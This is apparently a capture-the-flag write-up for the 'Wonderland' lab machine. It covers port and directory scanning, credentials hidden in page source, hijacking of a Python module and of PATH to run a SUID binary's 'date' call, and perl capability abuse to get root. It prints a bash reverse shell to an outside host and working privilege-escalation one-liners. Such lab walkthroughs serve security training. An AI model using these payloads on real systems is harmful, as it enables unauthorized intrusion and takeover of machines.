# Wonderland

## scan
```bash
# Nmap 7.91 scan initiated Sun Apr 11 10:59:08 2021 as: nmap -sC -sV -T4 -o scan -v 10.10.237.158
Increasing send delay for 10.10.237.158 from 0 to 5 due to 280 out of 699 dropped probes since last increase.
Nmap scan report for 10.10.237.158
Host is up (0.27s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr 11 10:59:54 2021 -- 1 IP address (1 host up) scanned in 46.08 seconds
```
**Server** : Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
**SSH **  :  OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
**HTTP methods** :  GET HEAD POST OPTIONS

## Web

**Title** : Follow the rabbit

####  - Gobuter
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.247.255                             
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.247.255
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/04/12 10:13:33 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 0] [--> img/]
/r                    (Status: 301) [Size: 0] [--> r/]
```
```bash 
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.247.255/r
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.247.255/r
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/04/12 10:15:10 Starting gobuster in directory enumeration mode
===============================================================
/a                    (Status: 301) [Size: 0] [--> a/]

```
Following the rabbit

Reading Source code of http://10.10.247.255/r/a/b/b/i/t
```html
<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
```

## SSH - Alice

**Username** : alice
**Password** : HowDothTheLittleCrocodileImproveHisShiningTail

```bash
alice@wonderland:~$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
alice@wonderland:~$
```
walrus_and_the_carpenter.py

```python
import random                     
poem = """The sun was shining on the sea,
..............................
They’d eaten every one."""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```
Unable to edit this file
```bash
alice@wonderland:~$ ls -la walrus_and_the_carpenter.py 
-rw-r--r-- 1 root root 3577 May 25  2020 walrus_and_the_carpenter.py
```
#### Hijacking random module

random. py
```python
import os

def choice(a):
        os.system("bash -c 'bash -i >& /dev/tcp/10.8.56.33/9001 0>&1'")
```

```bash
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
## Got shell - as **rabbit** user
```bash
$ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.8.56.33] from (UNKNOWN) [10.10.247.255] 58118
rabbit@wonderland:~$   
```
Custom **SUID**  Binary
```bash
rabbit@wonderland:~$ ls -la teaParty
ls -la teaParty
-rwsr-sr-x 1 root root 16816 May 25  2020 teaParty
rabbit@wonderland:~$ 
```

Analyzing using ghidra

```c++
void main(void)

{
  setuid(0x3eb); //setting uid to 1003
  setgid(0x3eb); //setting gid to 1003
  puts("Welcome to the tea party!\nThe Mad Hatter will be here soon.");
  system("/bin/echo -n \'Probably by \' && date --date=\'next hour\' -R");
  puts("Ask very nicely, and I will give you some tea while you wait for him");
  getchar();
  puts("Segmentation fault (core dumped)");
  return;
}
```
uid 1003 in /etc/passwd
```bash
rabbit@wonderland:~$ cat /etc/passwd | grep 1003
cat /etc/passwd | grep 1003
hatter:x:1003:1003:Mad Hatter,,,:/home/hatter:/bin/bash
```
#### Hijack `date` binary
```bash
rabbit@wonderland:~$ echo "bash -c 'bash -i >& /dev/tcp/10.8.56.33/9001 0>&1'" > /tmp/date
rabbit@wonderland:~$ chmod +x /tmp/date
rabbit@wonderland:~$ ls -la /tmp/date
-rwxr-xr-x 1 rabbit rabbit 51 Apr 12 14:41 /tmp/date
rabbit@wonderland:~$ export PATH=/tmp:$PATH
rabbit@wonderland:~$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
```
run teaParty 

## Got Shell - as hatter
```bash
$ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.8.56.33] from (UNKNOWN) [10.10.247.255] 58120
hatter@wonderland:~$ 
```
password.txt 
**hatter** : **WhyIsARavenLikeAWritingDesk?**

#### Enumerating using linpeas.sh
```python
[+] Capabilities                                                                                                                                                    
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities  
Files with capabilities:                                                                                                                                              
/usr/bin/perl5.26.1 = cap_setuid+ep                                                                                                                                   
/usr/bin/mtr-packet = cap_net_raw+ep                                                                                                                                  
/usr/bin/perl = cap_setuid+ep 
```
Referrer : https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/

## Root

```bash
hatter@wonderland:~$ /usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
root@wonderland:~#
```

